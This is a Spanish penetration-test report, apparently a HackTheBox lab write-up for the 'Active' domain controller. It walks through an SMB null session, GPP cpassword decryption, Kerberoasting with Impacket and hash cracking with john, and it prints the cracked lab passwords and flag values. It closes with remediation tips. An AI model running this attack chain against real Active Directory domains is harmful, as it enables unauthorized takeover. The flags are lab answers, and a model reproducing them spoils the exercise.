INFORME DE PENETRACIÓN - ACTIVE.HTB

Fecha: 8 de abril de 2026
Tester: [Tu nombre]
Objetivo: 10.129.16.57 (Controlador de Dominio)
Resultado: ✅ Compromiso total
📊 Resumen Ejecutivo
Métrica	Resultado
Compromiso inicial	✅ Sin credenciales
Escalada a Administrator	✅ Exitosa
Tiempo total	2 horas
Riesgo	Crítico

Se comprometió completamente el controlador de dominio active.htb partiendo de cero conocimiento. El ataque utilizó: null session SMB → credenciales en GPP → Kerberoasting → acceso como Administrator.
🔍 Hallazgos Principales
#	Hallazgo	Severidad	Credencial obtenida
1	Null session en SMB	🔴 Alta	Acceso a Replication
2	Credenciales en Groups.xml	🔴 Crítica	SVC_TGS:GPPstillStandingStrong2k18
3	Kerberoasting a Administrator	🔴 Alta	Administrator:Ticketmaster1968
🏁 Flags Obtenidas
Flag	Valor
user.txt	9d303b6e0e7ed8b1ab958c74fe7bb2be
root.txt	b0f8e5e06be2f66c7578943c3cc5b193
🔑 Credenciales
Usuario	Contraseña
active.htb\SVC_TGS	GPPstillStandingStrong2k18
active.htb\Administrator	Ticketmaster1968
🛠️ Herramientas Usadas
Herramienta	Uso
nmap	Escaneo de puertos
smbclient	Enumeración SMB
gpp-decrypt	Descifrar cpassword
GetUserSPNs.py (Impacket)	Kerberoasting
john	Cracking de hash
📝 Resumen de Ataque (Paso a Paso)
text

1. nmap -p- --min-rate 5000 -Pn 10.129.16.57
   → Puertos 53,88,389,445 → Controlador de Dominio

2. smbclient -L //10.129.16.57/ -N
   → Recurso "Replication" accesible anónimamente

3. Explorar Replication → encontrar Groups.xml
   → cpassword para usuario SVC_TGS

4. gpp-decrypt → GPPstillStandingStrong2k18

5. smbclient //10.129.16.57/Users -U SVC_TGS
   → Obtener user.txt

6. GetUserSPNs.py -request → hash de Administrator

7. john --wordlist=rockyou.txt → Ticketmaster1968

8. smbclient //10.129.16.57/C$ -U Administrator
   → Obtener root.txt

✅ Recomendaciones Rápidas
Hallazgo	Solución
Null session SMB	restrictanonymous = 1 en registro
Credenciales en GPP	Eliminar archivos XML con cpassword
Kerberoasting	Contraseñas largas (+25 caracteres) o gMSA

